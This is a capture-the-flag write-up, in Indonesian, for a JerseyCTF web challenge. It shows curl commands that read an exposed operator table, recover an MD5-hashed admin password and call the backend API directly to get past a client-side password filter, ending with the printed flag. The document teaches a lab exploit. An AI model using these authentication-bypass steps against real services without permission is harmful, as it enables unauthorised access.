# Orbital Relay Console - Writeup

## Ringkasan
Challenge ini punya tema bypass autentikasi di web terminal. Clue pentingnya ada di deskripsi dan source JavaScript: login langsung dengan credential literal diblokir oleh filter input di sisi terminal, tapi backend API tetap menerima kredensial valid.

Flag yang didapat:

`JCTF{RELAY_RESTORED_ORBITAL_SYNC}`

## Informasi Target
- URL: `http://orbital-relay-console.aws.jerseyctf.com:8080`
- Kategori: Web
- Goal: dapat akses admin lalu jalankan restore relay untuk keluarin token/flag.

## Langkah 1 - Enumerasi Awal
Saya mulai dari ambil halaman utama:

```bash
curl -i -s http://orbital-relay-console.aws.jerseyctf.com:8080/
```

Terlihat frontend pakai:
- `terminal.js`
- `jquery.terminal`

Lalu ambil source JS:

```bash
curl -s http://orbital-relay-console.aws.jerseyctf.com:8080/terminal.js -o terminal.js
```

## Langkah 2 - Analisis Source
Di `terminal.js`, poin pentingnya:

1. Ada filter input:
```js
const forbiddenPasswords = ["orion"];
```
Input yang mengandung string ini akan ditolak **di terminal handler**.

2. Command `connect` manggil API backend:
```js
fetch("/api/connect", { method: "POST", body: JSON.stringify({ user, pass }) })
```

3. Command `relink` manggil endpoint admin:
```js
fetch("/api/relay/restore", { method: "POST" })
```

4. Mode `db` bisa query:
- `SELECT * FROM operators`
- endpoint: `/api/db/operators`

Ini ngasih indikasi jelas kalau proteksi utama cuma di layer terminal/UI (client-side logic), bukan di endpoint publiknya.

## Langkah 3 - Verifikasi Data Credential
Coba query operator langsung:

```bash
curl -i -s http://orbital-relay-console.aws.jerseyctf.com:8080/api/db/operators
```

Hasil:

```json
[{"hash_type":"md5","password_hash":"487a76824d56a9df2c8a18f6a05329d5","username":"admin"}]
```

Hash MD5 tersebut adalah `orion`.

## Langkah 4 - Bypass dan Ambil Session Admin
Walaupun string `orion` diblokir di UI terminal, API langsung tetap bisa dipanggil:

```bash
curl -i -s -X POST http://orbital-relay-console.aws.jerseyctf.com:8080/api/connect \
  -H 'Content-Type: application/json' \
  --data '{"user":"admin","pass":"orion"}'
```

Response `200 OK` dan ngasih cookie session role admin.

## Langkah 5 - Trigger Relay Restore (Ambil Flag)
Pakai cookie session hasil login tadi:

```bash
curl -i -s -b cookie.txt -X POST http://orbital-relay-console.aws.jerseyctf.com:8080/api/relay/restore
```

Response:

```json
{"token":"JCTF{RELAY_RESTORED_ORBITAL_SYNC}"}
```

## Inti Vulnerability
- **Client-side filter trust issue**: kontrol keamanan ditempatkan di terminal input parser (`containsForbidden`) alih-alih enforce ketat di backend.
- Endpoint sensitif (`/api/connect`) tetap menerima credential valid saat dipanggil langsung.
- Akibatnya autentikasi bisa di-bypass dari luar antarmuka terminal.

## Solver Otomatis
File solver sudah disimpan sebagai `solver.py` di folder ini.

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
cd /home/nata/jerseyctf/web/orbitalrelayconsole
python3 solver.py
```

Output akan langsung menampilkan flag.
